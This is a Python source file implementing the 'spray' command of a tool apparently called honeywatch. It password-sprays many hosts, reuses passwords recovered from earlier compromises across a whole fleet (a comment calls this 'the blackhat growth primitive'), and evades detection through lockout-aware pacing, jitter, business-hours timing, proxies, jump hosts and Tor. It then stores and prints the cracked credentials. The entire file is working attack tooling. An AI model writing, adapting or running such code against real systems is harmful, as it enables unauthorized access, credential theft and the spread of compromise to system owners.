"""`honeywatch spray` command handler, split out for import cleanliness."""

from __future__ import annotations

import sys
import time


def _cmd_spray(args, argv) -> int:
    import json as _json

    from honeywatch.config import load_config
    from honeywatch.spray import SprayHost, build_password_schedule, spray_targets
    from honeywatch.store import Store

    from honeywatch.cli import parse_host, _enforce_vpn

    cfg = load_config(args.config)
    if not _enforce_vpn(cfg, args.skip_vpn_check):
        return 2

    db_path = args.db or getattr(cfg.storage, "db", "honeywatch.db")
    vault_pass = args.vault_passphrase or getattr(getattr(cfg, "storage", None), "vault_passphrase", None)
    store = Store(db_path, vault_passphrase=vault_pass)

    users: list[str] = []
    if args.users:
        users = [u.strip() for u in args.users.split(",") if u.strip()]
    if args.user_file:
        try:
            with open(args.user_file, "r", encoding="utf-8") as fh:
                users += [u.strip() for u in fh if u.strip() and not u.startswith("#")]
        except OSError as exc:
            print("spray: cannot read user file: " + str(exc), file=sys.stderr)
            return 1
    if not users:
        from honeywatch.crack import default_users
        users = default_users()

    passwords: list[str] = []
    if args.passwords:
        passwords = [p.strip() for p in args.passwords.split(",") if p.strip()]
    if args.password_file:
        try:
            with open(args.password_file, "r", encoding="utf-8") as fh:
                passwords += [p.strip() for p in fh if p.strip() and not p.startswith("#")]
        except OSError as exc:
            print("spray: cannot read password file: " + str(exc), file=sys.stderr)
            return 1

    # Fleet reuse: spray every recovered password across every discovered host.
    # Password reuse across a fleet is the blackhat growth primitive.
    if args.reuse_creds and not passwords:
        creds = store.query_credentials(limit=100000)
        passwords = list({c["password"] for c in creds if c.get("password")})
        if not passwords:
            print("spray --reuse-creds: no stored passwords to reuse")
            return 0

    if not passwords:
        passwords = ["Summer2024!", "Winter2024!", "Changeme123", "Welcome1"]

    hosts_pairs: list[tuple[str, int]] = []
    if args.targets:
        for spec in args.targets:
            ip, port = parse_host(spec)
            hosts_pairs.append((ip, port))
    if args.target_file:
        try:
            with open(args.target_file, "r", encoding="utf-8") as fh:
                for line in fh:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    ip, port = parse_host(line)
                    hosts_pairs.append((ip, port))
        except OSError as exc:
            print("spray: cannot read target file: " + str(exc), file=sys.stderr)
            return 1
    if not hosts_pairs and (args.target_label or args.min_confidence is not None):
        rows = store.query(
            limit=args.limit or 1000,
            label=args.target_label,
            min_confidence=args.min_confidence or 0.0,
        )
        for row in rows:
            hosts_pairs.append((row["ip"], int(row["port"])))
    if not hosts_pairs and args.reuse_creds:
        rows = store.query(limit=100000)
        for row in rows:
            hosts_pairs.append((row["ip"], int(row["port"])))

    if not hosts_pairs:
        print("spray: no targets. Pass hosts, --target-file, --target-label, or --reuse-creds.")
        return 0

    seen: set[tuple[str, int]] = set()
    unique: list[tuple[str, int]] = []
    for ip, port in hosts_pairs:
        if (ip, port) not in seen:
            seen.add((ip, port))
            unique.append((ip, port))

    spray_hosts = [SprayHost(ip=ip, port=port, users=list(users)) for ip, port in unique]
    schedule = build_password_schedule(passwords, per_password_cooldown=args.lockout_delay)
    print("spraying " + str(len(spray_hosts)) + " host(s) x " + str(len(users))
          + " users, " + str(len(schedule)) + " password round(s); lockout-safe cadence")

    all_results: list = []
    for pw, cooldown in schedule:
        def on_attempt(attempt, result):
            if not args.json:
                mark = "+" if attempt.success else "-"
                masked = "*" * len(attempt.password)
                src = " via " + str(attempt.source) if attempt.source else ""
                print("  [" + mark + "] " + result.ip + ":" + str(result.port)
                      + " " + attempt.user + ":" + masked + src, flush=True)

        res = spray_targets(
            password=pw, hosts=spray_hosts, delay=args.delay, jitter=args.jitter,
            lockout_delay=args.lockout_delay, business_hours=args.business_hours,
            skip_publickey_only=not args.no_precheck, host_concurrency=args.host_concurrency,
            proxy_file=args.proxy_file, jump_file=args.jump_file,
            max_user_attempts=getattr(args, "max_user_attempts", 0) or 0,
            on_attempt=on_attempt,
            tor=f"socks5://127.0.0.1:{args.tor_port}" if args.tor else None,
        )
        all_results.extend(res)

        # Lockout-safe cadence: wait out the per-password cooldown between
        # rounds so we don't fire the next password while a lockout window is
        # still open. (Skip after the final round.)
        if cooldown and pw != schedule[-1][0]:
            time.sleep(cooldown)

        if not args.no_save:
            for r in res:
                if r.success:
                    store.upsert_credential(
                        r.ip, r.port, r.user or "", r.password,
                        banner=None, attempts=r.attempts, source="spray",
                    )

    if args.json:
        print(_json.dumps([r.credential() for r in all_results], indent=2, default=str))
        return 0

    wins = [r for r in all_results if r.success]
    skips = [r for r in all_results if r.skipped]
    print("\nspray summary")
    print("  hosts:     " + str(len(spray_hosts)))
    print("  attempts:  " + str(sum(r.attempts for r in all_results)))
    print("  skipped:  " + str(len(skips)) + " (publickey-only / unreachable)")
    print("  recovered: " + str(len(wins)))
    if wins:
        print("\ncredentials:")
        for r in wins:
            print("  " + r.ip + ":" + str(r.port) + "  " + str(r.user) + ":" + str(r.password))
    return 0